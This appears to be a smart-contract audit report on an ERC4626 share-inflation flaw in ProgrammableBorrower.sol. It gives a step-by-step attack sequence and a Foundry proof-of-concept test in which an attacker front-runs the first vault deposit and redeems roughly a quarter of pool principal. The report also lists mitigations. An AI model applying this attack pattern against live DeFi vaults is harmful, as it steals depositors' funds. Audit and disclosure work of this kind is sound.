### Title
Unprotected ERC4626 deposit lets a first depositor steal programmable-borrower principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower.onStartEpoch` deposits all idle pool assets into the configured ERC4626 vault through `_depositToVault`, but accepts however many shares the vault returns without a minimum-shares or post-deposit valuation check. If the vault is empty, an ordinary vault user can front-run the first epoch deposit with the classic share-inflation sequence, cause the borrower contract to receive an unfairly small share position, and redeem part of the pool’s deposited principal. The strategy then records a vault loss or fails to satisfy the epoch stop amount, harming LP solvency. [1](#0-0) [2](#0-1) 

### Finding Description
The vulnerable flow is:

1. While programmable accounting is inactive, an attacker observes an empty configured vault.
2. The attacker deposits `1 wei` and receives `1` vault share.
3. The attacker donates approximately `D / 2` underlying directly to the vault, where `D` is the pool deposit expected at `startEpoch`.
4. `onStartEpoch` calculates `startAssets` from the borrower contract’s balances and calls `_depositToVault`. [3](#0-2) 
5. `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but neither validates `shares` against `previewDeposit` nor rejects a materially adverse share count. [2](#0-1) 
6. With a naive `assets * totalSupply / totalAssets` vault, the borrower receives one share while the attacker retains the other share, despite supplying only about one-third of final vault assets.
7. The attacker redeems, extracting roughly `D / 4` more than their net contribution.
8. `_currentVaultAssets` reports only the borrower’s remaining share value, and `_vaultNetInterest` records the shortfall as a vault loss. [4](#0-3) [5](#0-4) 

This is not a generic malicious-vault assumption: the attacker only performs normal ERC4626 deposits, direct asset transfers, and withdrawals available to any vault user. The missing control is in `ProgrammableBorrower`, which supplies no slippage bound to an external share-mint operation. [2](#0-1) 

### Impact Explanation
A first deposit of `D` into a freshly inflated vault can lose up to approximately `D / 4` to the attacker under standard integer share math. For example, with `D = 100 ether`, an attacker can seed one share and donate approximately `50 ether`; the borrower receives one share for `100 ether`, the attacker redeems half of approximately `150 ether`, and the pool loses approximately `25 ether` net to the attacker. [1](#0-0) 

The loss is later represented as vault PnL through `_vaultNetInterest`; if too little value remains to cover the amount requested by IdleCDO, `onStopEpoch` intentionally returns success so the following borrower transfer can fail into default handling. [6](#0-5) [7](#0-6) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or nearly empty when the first programmable epoch starts, and it must use a vault implementation whose share price can be inflated by direct asset donations. The condition is plausible when onboarding a new vault or after `setVault` changes integrations, because no minimum vault supply, liquidity threshold, slippage check, or trusted seed position is enforced. [8](#0-7) [2](#0-1) 

The exploit does not require the borrower, owner, manager, guardian, or vault administrator to be malicious. A mempool observer only needs enough capital for the initial donation, and part of that capital is recovered through the inflated share redemption. [9](#0-8) 

### Recommendation
Do not call ERC4626 `deposit` without validating the minted shares. At minimum:

- compare `shares` to `vault.previewDeposit(_assetAmount)` and revert on excessive deviation;
- preferably use a vault interface supporting `mint` plus `previewMint`, or enforce `shares >= minSharesOut`;
- require a nonzero deployed vault supply or initialize the integration with a protected seed position;
- verify `vault.convertToAssets(shares)` is within a bounded rounding tolerance of `_assetAmount`;
- treat conversion/share-count failures as unavailable liquidity rather than silently recording the deposited principal baseline.

### Proof of Concept
The following Foundry pattern reproduces the share inflation against a standard donation-sensitive ERC4626 mock. The production-relevant assertions are the one-share mint, attacker profit, and resulting borrower loss.

```solidity
// test/foundry/ProgrammableBorrowerInflation.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflationERC20 is ERC20 {
  constructor() ERC20("Underlying", "UND") {}
  function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract InflationVault is ERC20 {
  InflationERC20 public immutable assetToken;

  constructor(address asset_) ERC20("Vault Share", "vUND") {
    assetToken = InflationERC20(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * assetToken.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0
      ? assets
      : assets * supply / assetsBefore;

    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function balanceOf(address owner) public view override returns (uint256) {
    return super.balanceOf(owner);
  }
}

contract ProgrammableBorrowerInflationTest is Test {
  InflationERC20 internal underlying;
  InflationVault internal vault;
  ProgrammableBorrower internal borrower;

  address internal attacker = makeAddr("attacker");
  address internal idleCDO = makeAddr("idleCDO");
  address internal owner = makeAddr("owner");
  address internal manager = makeAddr("manager");
  address internal realBorrower = makeAddr("borrower");

  function testFirstDepositInflationStealsPrincipal() external {
    underlying = new InflationERC20();
    vault = new InflationVault(address(underlying));

    borrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
      address(new ProgrammableBorrower()),
      makeAddr("proxyAdmin"),
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        address(vault),
        address(new CDOStub(address(underlying))),
        owner,
        manager,
        realBorrower,
        0
      )
    )));

    uint256 poolDeposit = 100 ether;
    uint256 donation = 50 ether;

    underlying.mint(attacker, donation + 1);
    underlying.mint(address(borrower), poolDeposit);

    // Attacker seeds one share and inflates the vault share price.
    vm.startPrank(attacker);
    underlying.approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);
    underlying.transfer(address(vault), donation);
    vm.stopPrank();

    // IdleCDO starts the epoch and deposits all idle assets.
    vm.prank(borrower.idleCDO());
    borrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrower)), 1);
    assertEq(vault.balanceOf(attacker), 1);

    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    // The attacker supplied 50 ether + 1 wei but receives about half of 150 ether.
    assertGt(underlying.balanceOf(attacker) - attackerBefore, donation + 20 ether);
    assertLt(borrower.totalUnderlying(), poolDeposit * 80 / 100);
    assertGt(borrower.vaultLoss(), 20 ether);
  }
}

contract CDOStub {
  address public token;
  constructor(address token_) { token = token_; }
}
```

The exact stolen amount depends on the vault’s decimals, virtual-share protection, and rounding behavior, but `ProgrammableBorrower` currently has no guard that limits the loss at the point where pool principal is exchanged for shares. [2](#0-1)
